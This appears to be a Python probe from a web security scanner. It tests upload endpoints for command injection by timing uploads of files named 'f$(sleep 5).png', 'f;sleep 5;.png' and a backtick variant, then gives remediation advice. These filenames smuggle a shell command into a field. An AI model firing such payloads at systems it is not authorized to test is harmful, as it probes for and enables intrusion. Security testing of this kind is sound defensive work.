#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Command injection via uploaded filename metacharacters.

Apps that hand off uploaded files to a shell pipeline (ImageMagick
``convert``, ``ffmpeg``, ``unoconv``, antivirus scanner shell-out,
or any ``os.system("convert " + filename + " ...")`` pattern)
become vulnerable when the filename carries shell metacharacters.
The classic trigger is to name the file ``f$(sleep5).png`` or
``f;sleep 5;.png`` — if the post-upload pipeline pastes the
filename into a shell command, the side effect is a 5-second
delay.

Generalises the existing ``cmdi_filename_param_in_query`` (which
tests query-parameter shell-out). This variant tests the upload
filename itself.

Safety: we use ``sleep 5`` only — never ``rm`` / ``curl`` / any
side-effecting payload. The 8-byte placeholder body is a tiny
PNG-shaped sequence; it can't realistically corrupt a real image
pipeline.

False-positive control:
  * Two trials per metacharacter variant; we average. A single
    slow request could be unrelated network jitter.
  * A control upload (no metacharacters) is timed in the same
    interleave. The signal is a >= 4500 ms mean delta between the
    metacharacter upload and the control AND the control mean
    must be <= 1000 ms (otherwise the server is just slow and the
    comparison is meaningless).

Detection signal:
  mean(metacharacter_upload_ms) - mean(control_upload_ms) >= 4500
  AND mean(control_upload_ms) <= 1000.
"""
from __future__ import annotations

import secrets
import statistics
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Common upload paths. We try in priority order; first that
# accepts our control upload becomes the active target.
UPLOAD_PATHS = (
    "/file-upload",
    "/upload",
    "/api/upload",
    "/api/file/upload",
    "/api/files",
    "/files/upload",
)

# Tiny PNG header — 8 bytes, structurally enough that some
# upload validators that sniff magic-bytes will accept it. We
# never need a full valid PNG; the goal is to exercise the
# filename, not the content.
TINY_PNG = b"\x89PNG\r\n\x1a\n"

# Filenames. The control name must NOT contain any shell
# metacharacter — it provides the timing baseline. Each variant
# embeds a `sleep 5`; if the server pastes the filename into a
# shell, the upload response is delayed by ~5 s.
CONTROL_NAME = "round12-control.png"
META_VARIANTS = (
    ("dollar_paren",  "f$(sleep 5).png"),
    ("semicolon",     "f;sleep 5;.png"),
    ("backtick",      "f`sleep 5`.png"),
)

TRIALS_PER_VARIANT = 2
CONTROL_TRIALS     = 2

# Thresholds — see false-positive control comment above.
DELAY_DELTA_MS_MIN  = 4500   # metacharacter upload must be >= 4.5 s slower
CONTROL_MEAN_MAX_MS = 1000   # control upload must be <= 1 s


def _multipart(filename: str, content: bytes,
               field: str = "file") -> tuple[str, bytes]:
    """Hand-roll a minimal multipart/form-data body. Same shape as
    `xxe_file_upload._build_multipart` — kept local so the probe
    is self-contained."""
    boundary = "----dast-cmdi-" + secrets.token_hex(8)
    crlf = b"\r\n"
    parts = [
        ("--" + boundary).encode(),
        (f'Content-Disposition: form-data; name="{field}"; '
         f'filename="{filename}"').encode(),
        b"Content-Type: image/png",
        b"",
        content,
        ("--" + boundary + "--").encode(),
        b"",
    ]
    return boundary, crlf.join(parts)


def _time_upload(client: SafeClient, url: str,
                 filename: str) -> tuple[int, int]:
    """Send one upload, returning (status, elapsed_ms)."""
    boundary, body = _multipart(filename, TINY_PNG)
    r = client.request("POST", url, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }, body=body)
    return r.status, r.elapsed_ms


class CmdiUploadFilenameMetacharacterProbe(Probe):
    name = "cmdi_upload_filename_metacharacter"
    summary = ("Detects command injection via uploaded filename — "
               "compares upload time for a metacharacter filename "
               "vs a control name and flags multi-second deltas.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--upload-path", action="append", default=[],
            help="Additional upload endpoint to try (repeatable).")
        parser.add_argument(
            "--field", default="file",
            help="Multipart field name (default: file).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(UPLOAD_PATHS) + list(args.upload_path or [])

        # First, find a path that accepts our control upload. We
        # don't insist on 200 — many servers reply 201 / 202 / 415
        # — but we do insist that the response came back in well
        # under the threshold so we have a meaningful baseline.
        live_path: str | None = None
        baseline_ms: list[int] = []
        for p in paths:
            url = urljoin(origin, p)
            status, ms = _time_upload(client, url, CONTROL_NAME)
            if status > 0 and ms <= CONTROL_MEAN_MAX_MS:
                live_path = p
                baseline_ms.append(ms)
                # Take a second control sample for stability.
                _, ms2 = _time_upload(client, url, CONTROL_NAME)
                baseline_ms.append(ms2)
                break

        if not live_path:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: no upload endpoint on "
                         f"{origin} accepted the control upload "
                         "within the time bound."),
                evidence={"origin": origin,
                          "tried_paths": list(paths)},
            )

        url = urljoin(origin, live_path)
        ctrl_mean = statistics.mean(baseline_ms)

        attempts: list[dict] = [{
            "path": live_path, "label": "control",
            "name": CONTROL_NAME, "samples_ms": baseline_ms,
            "mean_ms": int(ctrl_mean),
        }]

        # For each metacharacter variant, take TRIALS_PER_VARIANT
        # samples and compare mean to the control mean. Stop on
        # first variant that crosses the threshold — we have
        # confirmation, no need to keep firing payloads.
        confirmed: dict | None = None
        for label, name in META_VARIANTS:
            samples: list[int] = []
            for _ in range(TRIALS_PER_VARIANT):
                _, ms = _time_upload(client, url, name)
                samples.append(ms)
            mean_ms = statistics.mean(samples)
            row = {"path": live_path, "label": label, "name": name,
                   "samples_ms": samples, "mean_ms": int(mean_ms),
                   "delta_vs_control_ms": int(mean_ms - ctrl_mean)}
            attempts.append(row)
            if (mean_ms - ctrl_mean >= DELAY_DELTA_MS_MIN
                    and ctrl_mean <= CONTROL_MEAN_MAX_MS):
                row["delay_triggered"] = True
                confirmed = row
                break

        evidence = {"origin": origin,
                    "control_mean_ms": int(ctrl_mean),
                    "delta_threshold_ms": DELAY_DELTA_MS_MIN,
                    "control_max_ms": CONTROL_MEAN_MAX_MS,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: command injection via filename at "
                    f"{origin}{confirmed['path']}. Filename "
                    f"`{confirmed['name']}` produced a mean response "
                    f"time of {confirmed['mean_ms']} ms vs "
                    f"{int(ctrl_mean)} ms for the control "
                    f"(delta {confirmed['delta_vs_control_ms']} ms) — "
                    "the embedded `sleep 5` executed."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Never paste an uploaded filename into a shell "
                    "command. If the post-upload pipeline calls an "
                    "external tool (ImageMagick, ffmpeg, antivirus), "
                    "spawn it via an argv-list API and pass an "
                    "internal sanitised path:\n"
                    "  - Python: `subprocess.run([\"convert\", "
                    "internal_path, ...], shell=False)`.\n"
                    "  - Java: `new ProcessBuilder(...)` with an "
                    "argument list, never `Runtime.exec(\"convert \" + name)`.\n"
                    "  - Node: `child_process.execFile` (argv) — "
                    "never `child_process.exec` (shell string).\n"
                    "Defence in depth: assign a server-side opaque "
                    "filename on receipt (UUID + correct extension) "
                    "so the user-supplied name never leaves the upload "
                    "handler."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: 3 metacharacter filename variants on "
                     f"{origin}{live_path} did not produce a "
                     f">= {DELAY_DELTA_MS_MIN} ms delay over the "
                     "control upload."),
            evidence=evidence,
        )


if __name__ == "__main__":
    CmdiUploadFilenameMetacharacterProbe().main()
